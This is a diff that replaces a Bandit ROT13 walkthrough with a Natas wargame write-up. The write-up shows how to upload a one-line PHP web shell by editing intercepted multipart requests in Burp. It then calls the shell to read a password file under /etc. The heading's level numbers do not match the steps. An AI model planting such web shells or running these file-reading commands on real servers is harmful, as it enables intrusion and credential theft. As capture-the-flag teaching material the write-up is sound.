@@ -1,65 +1,117 @@
-# OverTheWire Bandit: Level 11 → Level 12
+# Natas Level 11 → Level 12
 
-## Challenge Description
+**Goal:** Find the password for `natas13`. This level lets you upload a file (meant to be an image), but doesn't validate the file's actual content only trusts the `filename extension`, letting you upload a PHP shell.
 
-> The password for the next level is stored in the file `data.txt`, where all
-> lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.
+### Step 1: Set up Burp Suite
 
-**Goal:** Decode the contents of `data.txt` to retrieve the password for `bandit12`.
+- Open Burp Suite → go to Proxy tab → make sure Intercept is ON.
 
-**Connection:**
+- Configure your browser to route traffic through Burp's proxy (usually 127.0.0.1:8080), or use Burp's built-in browser (Proxy → Intercept → Open Browser).
 
-    ssh bandit11@bandit.labs.overthewire.org -p 2220
+### Step 2: Log in to the level
 
-## Concepts Involved
+In the Burp browser, go to:
 
-- **ROT13 cipher**: a simple letter-substitution cipher (a special case of the
-  Caesar cipher) that replaces each letter with the one 13 positions after it
-  in the alphabet. Since the English alphabet has 26 letters, applying ROT13
-  twice returns the original text, so the same operation both encodes and decodes.
+http://natas12.natas.labs.overthewire.org
 
-- **`tr` command**: a Unix utility that translates or deletes characters from
-  standard input.
+*Enter credentials when prompted:*
 
-- **Pipes (`|`)**: send the output of one command as the input of another.
+Username: natas12
+Password: (from level 11)
 
-## Solution
+### Step 3: Prepare a small PHP shell file
 
-### Step 1: Log in and inspect the file
-```bash
+On your machine, create a file called `shell.php`:
 
-    bandit11@bandit:~$ ls
-    data.txt
-
-    bandit11@bandit:~$ cat data.txt
-    Gur cnffjbeq vf <rotated text>
+```php
+<?php system($_GET['cmd']); ?>
 ```
 
-The output is readable-looking text, but the letters are shifted, which matches
-the `ROT13` hint from the challenge.
+Keep it small, the server rejects files over 1000 bytes.
 
-### Step 2: Decode with `tr`
+### Step 4: Use the upload form normally first
 
-We map each letter in `A-Z` / `a-z` to the letter 13 positions ahead, wrapping around:
+On the natas12 page, click "Choose File", select shell.php, and click Upload File but make sure Burp's Intercept is ON so the request pauses before it's sent.
 
-```bash
-    bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
-    The password is <Natas12_password>
+### Step 5: Intercept and inspect the request
+
+In Burp's Proxy → Intercept tab, you'll see a raw HTTP POST request like:
+
+```
+POST /index.php HTTP/1.1
+Host: natas12.natas.labs.overthewire.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXX
+...
+
+------WebKitFormBoundaryXXXX
+Content-Disposition: form-data; name="filename"
+
+shell.jpg
+------WebKitFormBoundaryXXXX
+Content-Disposition: form-data; name="uploadedfile"; filename="shell.jpg"
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundaryXXXX
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+------WebKitFormBoundaryXXXX--
 ```
 
-**How it works:**
+### Step 6: Modify the request in Burp
 
-|   Part         |                            Meaning                                                    |
+Since the server trusts the filename field (both the POST field and the file's filename= attribute) to decide the saved extension, edit both instances of the filename in the raw request from `shell.jpg` to `shell.php`:
 
-| `A-Za-z`       | The source set: all uppercase, then all lowercase letters                             |
-| `N-ZA-Mn-za-m` | The target set: the alphabet shifted by 13 (N→Z then A→M, and the same for lowercase) |
+```
+------WebKitFormBoundaryXXXX
+Content-Disposition: form-data; name="filename"
 
-`tr` replaces each character from the first set with the character at the same position in the second set. 
-For example, `G` becomes `T`, `u` becomes `h`, `r` becomes `e`, which turns `Gur` into `The`.
-   
+shell.php
+------WebKitFormBoundaryXXXX
+Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
+Content-Type: image/jpeg
 
-## Key Takeaways
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundaryXXXX
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
 
-- ROT13 is **not encryption**. It provides obfuscation only and is trivially reversible.
-- `tr` is a quick and powerful tool for character-level transformations.
-- ROT13 is symmetric: running the same command on the output returns the original text.
+1000
+------WebKitFormBoundaryXXXX--
+```
+
+You can edit this directly in Burp's Pretty/Raw request editor pane.
+
+### Step 7: Forward the request
+
+Click Forward (or Send) in Burp to let the modified request go through.
+
+### Step 8: Turn off Intercept and check the response
+
+Go to Proxy → HTTP History, find this request, and check the response. It should say something like:
+
+File uploaded, path: <a href="upload/ab12cd34ef.php">upload/ab12cd34ef.php</a>
+
+Copy that generated path.
+
+### Step 9: Trigger the shell
+
+In the browser (or a new Burp-proxied request via Repeater), visit:
+
+http://natas12.natas.labs.overthewire.org/upload/ab12cd34ef.php?cmd=cat+/etc/natas_webpass/natas13
+
+Tip: You can also do this directly in Burp:
+
+- Right-click the upload response in HTTP History → Send to Repeater.
+- In Repeater, create a new GET request to the uploaded path with the cmd parameter.
+- Click Send and view the response on the right.
+
+### Step 10: Get the password
+
+The response body will contain the output of the command:
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+*Lesson learned*
+
+Burp Suite is useful here because it lets you intercept and freely edit multipart form-data requests including filenames and Content-Type headers that a browser's UI wouldn't normally let you change before upload. This is exactly how attackers bypass client-side-only validation: the browser might restrict file picker options, but the actual HTTP request can be crafted however the attacker wants once intercepted.
